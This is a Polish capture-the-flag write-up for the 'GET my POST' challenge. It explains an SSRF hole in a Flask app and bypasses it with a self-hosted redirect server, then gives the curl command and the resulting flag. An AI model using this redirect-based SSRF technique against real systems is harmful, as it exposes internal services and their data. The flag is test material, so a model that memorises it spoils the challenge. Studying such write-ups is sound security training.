# GET my POST

Mamy podane dwa skrypty

`app.py`:
```python
import requests
from flask import Flask, request, abort

app = Flask(__name__)


@app.route('/submit', methods=['POST'])
def submit():
    if 'url' in request.json:
        return requests.post(request.json['url']).content
    else:
        abort(404)


@app.get("/")
def index():
    return "You can't connect to this API with your browser. Check the source code."


assert requests.get("http://internal:5001/flag").content.startswith(b"ecsc")

if __name__ == "__main__":
    app.run(port=5000)
```

oraz `internal.py`
```python
from flask import Flask

app = Flask(__name__)


@app.route('/flag', methods=['GET'])
def flag():
    return open("flag.txt", 'r').read()


if __name__ == "__main__":
    app.run(port=5001)
```

# SSRF (Server-Side Request Forgery)
`app.py` dostępna z zewnątrz przyjmuje POST na `/submit` i robi POST na podany URL
```python
if 'url' in request.json:
    return requests.post(request.json['url']).content
```
`internal.py` działa lokalnie na porcie 5001 i udostępnia flage na `/flag` **Ale tylko GET**, więc musimy przekonwertować POST na GET. Najprościej jest postawić własny serwer:
```python
from flask import Flask, redirect, request

app = Flask(__name__)

@app.route("/go", methods=["POST"])
def go():
    return redirect("http://internal:5001/flag", code=302)

if __name__ == "__main__":
    app.run(port=2222)
```
Następnie w URL podajemy adres naszego serwera i widzimy, że `app.py` robi request POST do naszego serwera, który ją przekierowywuje do `http://internal:5001/flag` i zwraca nam flagę.
```bash
curl -X POST https://get-my-post.ecsc25.hack.cert.pl/submit -H "Content-Type: application/json" -d '{"url":"https://twoj-serwer.com/go"}'
ecsc25{indirect_route}
```
